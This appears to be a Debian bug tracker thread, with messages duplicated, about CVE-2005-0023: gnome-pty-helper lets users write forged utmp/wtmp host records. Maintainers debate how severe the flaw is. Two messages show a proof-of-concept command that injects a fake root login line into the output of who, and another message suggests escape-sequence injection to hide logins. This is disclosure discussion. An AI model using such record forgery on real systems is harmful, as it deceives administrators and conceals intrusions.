+retitle 329156 [CAN-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+thanks
+
+Use CAN-2005-0023 for this issue.
+
+--
+ - mdz
+
+---
+Message 20 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Matt Zimmerman <email address hidden>
+To: <email address hidden>
+Subject: CVE name
+
+retitle 329156 [CAN-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+thanks
+
+Use CAN-2005-0023 for this issue.
+
+--
+ - mdz
+
+---
+Message 21 | Author: tb-becket | Subject: help needed
+tags 329156 +help
+thanks
+
+---
+Message 22 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Thomas Bushnell BSG <email address hidden>
+To: <email address hidden>
+Subject: help needed
+
+tags 329156 +help
+thanks
+
+---
+Message 23 | Author: muehlenhoff | Subject: foo
+tag 329156 security
+thanks
+--
+Moritz Muehlenhoff <email address hidden>     fon: +49 421 22 232- 0
+Development        Linux for Your Business       fax: +49 421 22 232-99
+Univention GmbH    http://www.univention.de/   mobil: +49 175 22 999 23
+
+---
+Message 24 | Author: lool | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+tags 329156 + upstream security
+forwarded 329156 http://bugzilla.gnome.org/show_bug.cgi?id=317312
+clone 329156 -1
+reassign -1 libvte4
+thanks
+
+[ THIS IS A RESEND, PREVIOUS MAIL WAS LOST. ]
+
+        Hi,
+
+On Tue, Sep 20, 2005, Paul Szabo wrote:
+> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+> existing records.
+
+ This vulnerability is identified as CAN-2005-0023.  The upstream
+ developers of vte have been notified of the bug at:
+    <http://bugzilla.gnome.org/show_bug.cgi?id=317312>
+
+     Bye,
+--
+Loïc Minier <email address hidden>
+
+---
+Message 25 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Moritz Muehlenhoff <email address hidden>
+To: <email address hidden>
+Subject: foo
+
+tag 329156 security
+thanks
+--
+Moritz Muehlenhoff <email address hidden>     fon: +49 421 22 232- 0
+Development        Linux for Your Business       fax: +49 421 22 232-99
+Univention GmbH    http://www.univention.de/   mobil: +49 175 22 999 23
+
+---
+Message 26 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+To: Paul Szabo <email address hidden>, <email address hidden>,
+	<email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+tags 329156 + upstream security
+forwarded 329156 http://bugzilla.gnome.org/show_bug.cgi?id=3D317312
+clone 329156 -1
+reassign -1 libvte4
+thanks
+
+[ THIS IS A RESEND, PREVIOUS MAIL WAS LOST. ]
+
+        Hi,
+
+On Tue, Sep 20, 2005, Paul Szabo wrote:
+> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> DISPLAY (host) settings. I am not sure if it can be tricked into erasin=
+g
+> existing records.
+
+ This vulnerability is identified as CAN-2005-0023.  The upstream
+ developers of vte have been notified of the bug at:
+    <http://bugzilla.gnome.org/show_bug.cgi?id=3D317312>
+
+     Bye,
+--=20
+Lo=EFc Minier <email address hidden>
+
+---
+Message 27 | Author: joey-infodrom | Subject: gnome-pty-helper foo
+Could somebody explain the security implication for me?
+
+being able to write arbitrary strings into valid records without
+overwriting any other data in utmp/wtmp can hardly be classified
+as a security vulnerability.
+
+(Apart from that, I'm only slightly annoyed as I had to learn about
+this via MITRE / GNOME Bugzilla instead of a mail from the maintainer
+to the security team?)
+
+Regards,
+
+	Joey
+
+--
+Everybody talks about it, but nobody does anything about it!  -- Mark Twain
+
+Please always Cc to me when replying to me on the lists.
+
+---
+Message 28 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Martin Schulze <email address hidden>
+To: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+Cc: Paul Szabo <email address hidden>, <email address hidden>,
+	Debian Security Team <email address hidden>
+Subject: gnome-pty-helper foo
+
+Could somebody explain the security implication for me?
+
+being able to write arbitrary strings into valid records without
+overwriting any other data in utmp/wtmp can hardly be classified
+as a security vulnerability.
+
+(Apart from that, I'm only slightly annoyed as I had to learn about
+this via MITRE / GNOME Bugzilla instead of a mail from the maintainer
+to the security team?)
+
+Regards,
+
+	Joey
+
+--
+Everybody talks about it, but nobody does anything about it!  -- Mark Twain
+
+Please always Cc to me when replying to me on the lists.
+
+---
+Message 29 | Author: lool | Subject: Re: gnome-pty-helper foo
+Hi,
+
+On Fri, Oct 07, 2005, Martin Schulze wrote:
+> Could somebody explain the security implication for me?
+
+ You can record in the utmp/wtmp logs something which is wrong, for
+ example that an user is currently connected to a display while he
+ isn't.  I'm not the one to argue with though.
+
+> being able to write arbitrary strings into valid records without
+> overwriting any other data in utmp/wtmp can hardly be classified
+> as a security vulnerability.
+
+ I have no idea, I'll let you judge of such things.  Since
+ gnome-pty-helper seemed to have some special permission to write to
+ utmp (because it is sgid), I took the problem seriously.  Whether this
+ issue is to be considered a security vulnerability or not, I couldn't
+ tell for sure, and in doubt I selected security, but I agree that it's
+ a minor issue anyway.
+
+> (Apart from that, I'm only slightly annoyed as I had to learn about
+> this via MITRE / GNOME Bugzilla instead of a mail from the maintainer
+> to the security team?)
+
+ For my defense (as I am the one which followed more or less this bug),
+ I'd claim that a/ this was reported against a GNOME 1 package (and it
+ was later discovered that the GNOME 2 package is affected too) which
+ was in the process of being orphaned, b/ this seemed like a very minor
+ issue, c/ I thought you were tracking "tags + security" bugs, and d/ I
+ didn't want to start bothering the security team for an issue not
+ discussed with upstream and without any patch.  Of course, there's also
+ e/ I don't have any security background or training, but that's
+ obvious.
+
+ My usual way of handling of sec bugs is i/ tag the bug security,
+ connect the relevant CVE ids, upstream bugs, available patches, ii/
+ talk with upstream, check the affected versions, check the patch causes
+ no regression, check the patch applies everywhere, check the patch
+ fixes the issue iii/ proposed a diff to the security team.
+
+ I know realize I should have contacted the security team quite
+ immediately, and will do so in the future.
+
+ I have more important things to track right now that this
+ vulnerability, and I didn't have any response from upstream yet.
+
+   Cheers,
+--
+Loïc Minier <email address hidden>
+
+---
+Message 30 | Author: psz-maths | Subject: Re: gnome-pty-helper foo
+Joey,
+
+> Could somebody explain the security implication for me?
+>
+> being able to write arbitrary strings into valid records without
+> overwriting any other data in utmp/wtmp can hardly be classified
+> as a security vulnerability.
+
+It depends on what trust you place in the correctness of utmp/wtmp. Knowing
+that records are often left behind (not cleaned up or closed), you may have
+grown to regard them as useless data. However in that case they should be
+abandoned: getting rid of many setuid/setgid objects, improving security.
+(Records left behind may be regarded as a security issue: how do you know
+when all users are off and it is "safe" to reboot?)
+
+Some people would like to rely on utmp/wtmp correctness. If I see user X
+doing something funny: do I run to office A or office B? Some academics
+(foolishly?) like to allocate "participation marks" (attendance records) to
+students in their tutorial: based on utmp/wtmp, that is surely useless.
+When allowing users access to USB sticks on their "thin client" terminals,
+how do I know if they "own" (are logged in to) that particular terminal:
+run xhost and check return status, wasting resources...
+
+As I commented elsewhere, I do not think any Debian utilities ever use
+utmp/wtmp. Are you then at freedom to abandon them?
+
+Viewed another way: users are not meant to be able to write fake utmp/wtmp
+records. But they can. Anything that users can do, without authority, is a
+security issue. Any unexpected behaviour is a potential security issue.
+
+> (Apart from that, I'm only slightly annoyed as I had to learn about
+> this via MITRE / GNOME Bugzilla instead of a mail from the maintainer
+> to the security team?)
+
+Would I have been allowed to contact the security team directly? Are not
+all security-tagged bug reports monitored, as a matter of course? (Are they
+knowledgeable to advise on your questions above?)
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 31 | Author: joey-infodrom | Subject: Re: gnome-pty-helper foo
+severity 329156 normal
+thanks dude
+
+Loïc Minier wrote:
+>         Hi,
+>
+> On Fri, Oct 07, 2005, Martin Schulze wrote:
+> > Could somebody explain the security implication for me?
+>
+>  You can record in the utmp/wtmp logs something which is wrong, for
+>  example that an user is currently connected to a display while he
+>  isn't.  I'm not the one to argue with though.
+
+Ok, so unless somebody proves us wrong we don't consider this a
+security problem.
+
+Regards,
+
+	Joey
+
+--
+Everybody talks about it, but nobody does anything about it!  -- Mark Twain
+
+Please always Cc to me when replying to me on the lists.
+
+---
+Message 32 | Author: lool | Subject: Re: gnome-pty-helper foo
+Hi,
+
+On Fri, Oct 07, 2005, Martin Schulze wrote:
+> severity 329156 normal
+> thanks dude
+
+ You didn't Cc: control, I've bounced it to control.
+
+> Ok, so unless somebody proves us wrong we don't consider this a
+> security problem.
+
+ Is something to be done for the allocated CVE id?
+
+   Cheers,
+--
+Loïc Minier <email address hidden>
+
+---
+Message 33 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+To: Paul Szabo <email address hidden>, <email address hidden>,
+	Debian Security Team <email address hidden>
+Subject: Re: gnome-pty-helper foo
+
+        Hi,
+
+On Fri, Oct 07, 2005, Martin Schulze wrote:
+> Could somebody explain the security implication for me?
+
+ You can record in the utmp/wtmp logs something which is wrong, for
+ example that an user is currently connected to a display while he
+ isn't.  I'm not the one to argue with though.
+
+> being able to write arbitrary strings into valid records without
+> overwriting any other data in utmp/wtmp can hardly be classified
+> as a security vulnerability.
+
+ I have no idea, I'll let you judge of such things.  Since
+ gnome-pty-helper seemed to have some special permission to write to
+ utmp (because it is sgid), I took the problem seriously.  Whether this
+ issue is to be considered a security vulnerability or not, I couldn't
+ tell for sure, and in doubt I selected security, but I agree that it's
+ a minor issue anyway.
+
+> (Apart from that, I'm only slightly annoyed as I had to learn about
+> this via MITRE / GNOME Bugzilla instead of a mail from the maintainer
+> to the security team?)
+
+ For my defense (as I am the one which followed more or less this bug),
+ I'd claim that a/ this was reported against a GNOME 1 package (and it
+ was later discovered that the GNOME 2 package is affected too) which
+ was in the process of being orphaned, b/ this seemed like a very minor
+ issue, c/ I thought you were tracking "tags + security" bugs, and d/ I
+ didn't want to start bothering the security team for an issue not
+ discussed with upstream and without any patch.  Of course, there's also
+ e/ I don't have any security background or training, but that's
+ obvious.
+
+ My usual way of handling of sec bugs is i/ tag the bug security,
+ connect the relevant CVE ids, upstream bugs, available patches, ii/
+ talk with upstream, check the affected versions, check the patch causes
+ no regression, check the patch applies everywhere, check the patch
+ fixes the issue iii/ proposed a diff to the security team.
+
+ I know realize I should have contacted the security team quite
+ immediately, and will do so in the future.
+
+ I have more important things to track right now that this
+ vulnerability, and I didn't have any response from upstream yet.
+
+   Cheers,
+--=20
+Lo=EFc Minier <email address hidden>
+
+---
+Message 34 | Author: joey-infodrom | Subject: Re: gnome-pty-helper foo
+Loïc Minier wrote:
+>         Hi,
+>
+> On Fri, Oct 07, 2005, Martin Schulze wrote:
+> > severity 329156 normal
+> > thanks dude
+>
+>  You didn't Cc: control, I've bounced it to control.
+
+I usually use Bcc for that, so that group replies don't annoy
+our control dude. :)
+
+> > Ok, so unless somebody proves us wrong we don't consider this a
+> > security problem.
+>
+>  Is something to be done for the allocated CVE id?
+
+MITRE needs to decide on that.  I'll probably drop Steven a note.
+
+Regards,
+
+	Joey
+
+--
+Everybody talks about it, but nobody does anything about it!  -- Mark Twain
+
+Please always Cc to me when replying to me on the lists.
+
+---
+Message 35 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-Id: <email address hidden>
+From: Paul Szabo <email address hidden>
+To: <email address hidden>, <email address hidden>
+Cc: <email address hidden>, <email address hidden>
+Subject: Re: gnome-pty-helper foo
+
+Joey,
+
+> Could somebody explain the security implication for me?
+>
+> being able to write arbitrary strings into valid records without
+> overwriting any other data in utmp/wtmp can hardly be classified
+> as a security vulnerability.
+
+It depends on what trust you place in the correctness of utmp/wtmp. Knowing
+that records are often left behind (not cleaned up or closed), you may have
+grown to regard them as useless data. However in that case they should be
+abandoned: getting rid of many setuid/setgid objects, improving security.
+(Records left behind may be regarded as a security issue: how do you know
+when all users are off and it is "safe" to reboot?)
+
+Some people would like to rely on utmp/wtmp correctness. If I see user X
+doing something funny: do I run to office A or office B? Some academics
+(foolishly?) like to allocate "participation marks" (attendance records) to
+students in their tutorial: based on utmp/wtmp, that is surely useless.
+When allowing users access to USB sticks on their "thin client" terminals,
+how do I know if they "own" (are logged in to) that particular terminal:
+run xhost and check return status, wasting resources...
+
+As I commented elsewhere, I do not think any Debian utilities ever use
+utmp/wtmp. Are you then at freedom to abandon them?
+
+Viewed another way: users are not meant to be able to write fake utmp/wtmp
+records. But they can. Anything that users can do, without authority, is a
+security issue. Any unexpected behaviour is a potential security issue.
+
+> (Apart from that, I'm only slightly annoyed as I had to learn about
+> this via MITRE / GNOME Bugzilla instead of a mail from the maintainer
+> to the security team?)
+
+Would I have been allowed to contact the security team directly? Are not
+all security-tagged bug reports monitored, as a matter of course? (Are they
+knowledgeable to advise on your questions above?)
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 36 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Martin Schulze <email address hidden>
+To: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+Cc: Paul Szabo <email address hidden>, <email address hidden>,
+	Debian Security Team <email address hidden>
+Subject: Re: gnome-pty-helper foo
+
+severity 329156 normal
+thanks dude
+
+Lo=EFc Minier wrote:
+>         Hi,
+>=20
+> On Fri, Oct 07, 2005, Martin Schulze wrote:
+> > Could somebody explain the security implication for me?
+>=20
+>  You can record in the utmp/wtmp logs something which is wrong, for
+>  example that an user is currently connected to a display while he
+>  isn't.  I'm not the one to argue with though.
+
+Ok, so unless somebody proves us wrong we don't consider this a
+security problem.
+
+Regards,
+
+	Joey
+
+--=20
+Everybody talks about it, but nobody does anything about it!  -- Mark Twa=
+in
+
+Please always Cc to me when replying to me on the lists.
+
+---
+Message 37 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+To: Paul Szabo <email address hidden>, <email address hidden>,
+	Debian Security Team <email address hidden>
+Subject: Re: gnome-pty-helper foo
+
+        Hi,
+
+On Fri, Oct 07, 2005, Martin Schulze wrote:
+> severity 329156 normal
+> thanks dude
+
+ You didn't Cc: control, I've bounced it to control.
+
+> Ok, so unless somebody proves us wrong we don't consider this a
+> security problem.
+
+ Is something to be done for the allocated CVE id?
+
+   Cheers,
+--=20
+Lo=EFc Minier <email address hidden>
+
+---
+Message 38 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Martin Schulze <email address hidden>
+To: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+Cc: Paul Szabo <email address hidden>, <email address hidden>,
+	Debian Security Team <email address hidden>
+Subject: Re: gnome-pty-helper foo
+
+Lo=EFc Minier wrote:
+>         Hi,
+>=20
+> On Fri, Oct 07, 2005, Martin Schulze wrote:
+> > severity 329156 normal
+> > thanks dude
+>=20
+>  You didn't Cc: control, I've bounced it to control.
+
+I usually use Bcc for that, so that group replies don't annoy
+our control dude. :)
+
+> > Ok, so unless somebody proves us wrong we don't consider this a
+> > security problem.
+>=20
+>  Is something to be done for the allocated CVE id?
+
+MITRE needs to decide on that.  I'll probably drop Steven a note.
+
+Regards,
+
+	Joey
+
+--=20
+Everybody talks about it, but nobody does anything about it!  -- Mark Twa=
+in
+
+Please always Cc to me when replying to me on the lists.
+
+---
+Message 39 | Author: psz-maths | Subject: Re: gnome-pty-helper foo
+I have not yet found any uses for utmp/wtmp: maybe Joey is right and there
+is no security issue. I would then suggest that to increase security,
+setuid/setgid bits be removed from all utmp/wmtp maintainers.
+
+In the meantime, I hope that conscientious sysadmins do look at who and
+last output occasionally; an expect that
+
+psz@savona:~$ exploit "$(perl -e 'print "XX)\nroot     tty01        Jan 01 02:03 (insecure.com"')" & sleep 1; who; sleep 6
+[1] 22149
+Writing utmp (who) record ...
+utmp record will be cleaned up when we exit.
+To leave it behind, kill gnome-pty-helper: kill 22152
+Sleeping for 5 secs...
+psz      pts/2        Oct 12 12:16 (XX)
+root     tty01        Jan 01 02:03 (insecure.com)
+psz      pts/1        Oct 12 11:37 (y622.yt.maths.usyd.edu.au:0.0)
+[1]+  Done                    exploit "$(perl -e 'print "XX)\nroot     tty01        Jan 01 02:03 (insecure.com"')"
+psz@savona:~$
+
+should suitably freak them out.
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 40 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-Id: <email address hidden>
+From: Paul Szabo <email address hidden>
+To: <email address hidden>, <email address hidden>
+Subject: Re: gnome-pty-helper foo
+
+I have not yet found any uses for utmp/wtmp: maybe Joey is right and there
+is no security issue. I would then suggest that to increase security,
+setuid/setgid bits be removed from all utmp/wmtp maintainers.
+
+In the meantime, I hope that conscientious sysadmins do look at who and
+last output occasionally; an expect that
+
+psz@savona:~$ exploit "$(perl -e 'print "XX)\nroot     tty01        Jan 01 02:03 (insecure.com"')" & sleep 1; who; sleep 6
+[1] 22149
+Writing utmp (who) record ...
+utmp record will be cleaned up when we exit.
+To leave it behind, kill gnome-pty-helper: kill 22152
+Sleeping for 5 secs...
+psz      pts/2        Oct 12 12:16 (XX)
+root     tty01        Jan 01 02:03 (insecure.com)
+psz      pts/1        Oct 12 11:37 (y622.yt.maths.usyd.edu.au:0.0)
+[1]+  Done                    exploit "$(perl -e 'print "XX)\nroot     tty01        Jan 01 02:03 (insecure.com"')"
+psz@savona:~$
+
+should suitably freak them out.
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 41 | Author: joeyh | Subject: exploit via escape sequences?
+Well if this allows arbitrary data to be fed into the file and later
+be displayed by who or last then that data could be made to contain
+escape sequences, and either hide other lines that would normally be
+displayed (so you don't know someone has logged into the machine), or
+output other malicious escape sequences (key rebindings, whatever).
+
+Haven't tried it but it's a thought.
+
+--
+see shy jo
+
+---
+Message 42 | Author: fw | Subject: Re: Bug#329156: exploit via escape sequences?
+* Joey Hess:
+
+> Well if this allows arbitrary data to be fed into the file and later
+> be displayed by who or last then that data could be made to contain
+> escape sequences, and either hide other lines that would normally be
+> displayed (so you don't know someone has logged into the machine), or
+> output other malicious escape sequences (key rebindings, whatever).
+
+I think such things are considered terminal emulator bugs these days.
+(Which makes sense given that we can't fix head/tail/cat/...)
+
+---
+Message 43 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Joey Hess <email address hidden>
+To: <email address hidden>
+Subject: exploit via escape sequences?
+
+--Dxnq1zWXvFF0Q93v
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+Well if this allows arbitrary data to be fed into the file and later
+be displayed by who or last then that data could be made to contain
+escape sequences, and either hide other lines that would normally be
+displayed (so you don't know someone has logged into the machine), or
+output other malicious escape sequences (key rebindings, whatever).
+
+Haven't tried it but it's a thought.
+
+--=20
+see shy jo
+
+--Dxnq1zWXvFF0Q93v
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: Digital signature
+Content-Disposition: inline
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.2 (GNU/Linux)
+
+iD8DBQFDZS0Ld8HHehbQuO8RAhORAJ4oFkQwu4bibtoCPXfdQz2fTMHLJACcCpSg
+HQNfrzsCHODAfXQZNSX6U2M=
+=2du+
+-----END PGP SIGNATURE-----
+
+--Dxnq1zWXvFF0Q93v--
+
+---
+Message 44 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Florian Weimer <email address hidden>
+To: Joey Hess <email address hidden>
+Cc: <email address hidden>
+Subject: Re: Bug#329156: exploit via escape sequences?
+
+* Joey Hess:
+
+> Well if this allows arbitrary data to be fed into the file and later
+> be displayed by who or last then that data could be made to contain
+> escape sequences, and either hide other lines that would normally be
+> displayed (so you don't know someone has logged into the machine), or
+> output other malicious escape sequences (key rebindings, whatever).
+
+I think such things are considered terminal emulator bugs these days.
+(Which makes sense given that we can't fix head/tail/cat/...)
+
+---
+Message 45 | Author: pitti | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+See discussion, this is not terribly scary.
+
+---
+Message 46 | Author: pitti | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Not really a vuln nor important. Passed upstream, unassigning.
+
+---
+Message 47 | Author: dholbach | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Is /usr/lib/libvte9/gnome-pty-helper now.
+
+---
+Message 48 | Author: psz-maths | Subject: Re: gnome-pty-helper foo
+On 12 Oct 2005 (a long time ago!) I wrote:
+
+> I have not yet found any uses for utmp/wtmp ...
+
+I found a (wrongful) use for it recently, /bin/login relies on ut_line
+and chowns that to the user, see
+
+  http://bugs.debian.org/505271
+
+That is "not this bug", as this allows us to fake ut_host only...
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
